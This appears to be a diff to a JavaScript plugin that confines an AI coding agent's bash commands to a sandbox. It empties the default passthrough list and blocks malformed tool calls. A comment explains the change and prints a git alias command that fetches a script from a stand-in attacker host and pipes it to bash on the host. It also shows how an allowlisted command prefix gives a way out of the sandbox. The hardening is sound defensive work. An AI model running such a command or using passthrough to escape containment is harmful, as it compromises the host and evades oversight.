@@ -74,14 +74,30 @@ function pythonInterpreter() {
 /**
  * Commands that must not be redirected.
  *
- * Redirecting these would break the developer's local workflow rather than
- * protect it: the sandbox has its own filesystem, so a `git` command executed
- * there would operate on a different repository than the one OpenCode is
- * editing through `read` / `write` / `edit`.
+ * Empty by default, and that default is a security decision.
  *
- * Set CUBE_OPENCODE_PASSTHROUGH to a comma-separated list to change this.
+ * Passthrough is an arbitrary-host-execution escape hatch, not a narrow
+ * exception. Matching is on the leading token only, so allowing `git` allows
+ * every `git`-prefixed command — and git can be made to run arbitrary shell:
+ *
+ *     git -c alias.x='!curl http://attacker/sh | bash' x
+ *
+ * That executes on the host, unsandboxed and unlogged. Since the model's
+ * commands are precisely the untrusted input this plugin exists to contain, a
+ * default list containing `git` would re-open the host-execution path the
+ * plugin closes. Verified against real git: the alias form above does run.
+ *
+ * The trade-off is real and is why the list exists at all: the sandbox has its
+ * own filesystem, so a `git` command executed there operates on a different
+ * repository than the one OpenCode is editing through `read` / `write` /
+ * `edit`. Developers who need host git can opt in:
+ *
+ *     export CUBE_OPENCODE_PASSTHROUGH=git,gh
+ *
+ * Anything placed on this list must be treated as fully trusted with host
+ * privileges. Opting in is a deliberate choice; it should not be the default.
  */
-const DEFAULT_PASSTHROUGH = ["git", "gh", "opencode"];
+const DEFAULT_PASSTHROUGH = [];
 
 function passthroughPrefixes() {
   const raw = process.env.CUBE_OPENCODE_PASSTHROUGH;
@@ -251,10 +267,36 @@ export const CubeSandboxBashPlugin = async ({ client, directory }) => {
   return {
     "tool.execute.before": async (input, output) => {
       if (!input || input.tool !== "bash") return;
-      if (!output || !output.args) return;
+
+      // Fail closed on a payload we do not recognise. Returning here would let
+      // the call proceed to the host, contradicting the guarantee that a
+      // command which cannot be redirected safely is blocked rather than run.
+      // A bash call with no args, or with a non-string command, is exactly such
+      // a case: we cannot rewrite what we cannot read.
+      if (!output || !output.args) {
+        await log("error", "bash call has no args; blocking", {});
+        throw new Error(
+          "[cubesandbox-bash] the bash tool call carried no arguments, so the " +
+            "command could not be redirected into the sandbox. Refusing to run " +
+            "it on the host."
+        );
+      }
 
       const original = output.args.command;
-      if (typeof original !== "string" || original.trim() === "") return;
+
+      // A blank command is inert: nothing executes either way, so letting it
+      // through costs nothing and avoids noisy failures.
+      if (typeof original === "string" && original.trim() === "") return;
+
+      if (typeof original !== "string") {
+        await log("error", "bash command is not a string; blocking", {
+          type: typeof original,
+        });
+        throw new Error(
+          `[cubesandbox-bash] expected a string command, received ${typeof original}. ` +
+            "Refusing to run it on the host."
+        );
+      }
 
       // Idempotence guard. Multiple plugins may observe the same call, and a
       // second rewrite would nest the backend invocation inside itself.
